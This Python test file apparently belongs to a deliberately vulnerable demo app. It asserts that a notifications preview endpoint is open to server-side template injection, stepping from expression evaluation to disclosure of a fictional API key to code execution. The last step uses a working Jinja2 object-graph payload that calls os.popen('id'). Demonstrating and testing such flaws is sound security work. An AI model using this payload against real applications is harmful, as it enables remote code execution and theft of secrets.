"""The vulnerable app exhibits the full SSTI escalation ladder (FR-004, FR-013)."""

from __future__ import annotations

from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.orm import Session

from contextless.config import DEMO_SENTINEL, FICTIONAL_INTEGRATION_API_KEY
from contextless.domain.models import Order
from tests.conftest import GLOBEX_TOKEN, auth

# Object-graph traversal reaching os.popen('id') — the code-execution proof. This
# runs the read-only `id` command and nothing else.
RCE_PAYLOAD = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"


def _render(vulnerable_client: TestClient, body: str) -> str:
    response = vulnerable_client.post(
        "/notifications/preview",
        headers=auth(GLOBEX_TOKEN),
        json={"body": body, "order_reference": "1001"},
    )
    assert response.status_code == 200, response.text
    rendered: str = response.json()["rendered"]
    return rendered


def test_expression_is_evaluated(vulnerable_client: TestClient) -> None:
    assert _render(vulnerable_client, "{{ 7*191 }}") == "1337"


def test_configuration_secret_is_disclosed(vulnerable_client: TestClient) -> None:
    rendered = _render(vulnerable_client, "{{ config.integration_api_key }}")
    assert rendered == FICTIONAL_INTEGRATION_API_KEY


def test_demo_sentinel_is_reached(vulnerable_client: TestClient) -> None:
    assert _render(vulnerable_client, "{{ config.demo_sentinel }}") == DEMO_SENTINEL


def test_object_graph_reaches_code_execution(vulnerable_client: TestClient) -> None:
    rendered = _render(vulnerable_client, RCE_PAYLOAD)
    # A uid=…/gid=… line proves os.popen('id') executed inside the container.
    assert "uid=" in rendered
    assert "gid=" in rendered


def test_render_mode_is_template_source(vulnerable_client: TestClient) -> None:
    response = vulnerable_client.post(
        "/notifications/preview",
        headers=auth(GLOBEX_TOKEN),
        json={"body": "{{ order.number }}", "order_reference": "1001"},
    )
    assert response.json()["render_mode"] == "template-source"


def test_ladder_leaves_domain_state_unchanged(vulnerable_client: TestClient) -> None:
    engine = vulnerable_client.app.state.engine  # type: ignore[attr-defined]

    def snapshot() -> list[tuple[int, str, str, int]]:
        with Session(engine) as session:
            orders = session.scalars(select(Order).order_by(Order.id)).all()
            return [(o.id, o.number, o.status, o.tenant_id) for o in orders]

    before = snapshot()
    for body in ("{{ 7*191 }}", "{{ config.integration_api_key }}", RCE_PAYLOAD):
        _render(vulnerable_client, body)
    assert snapshot() == before
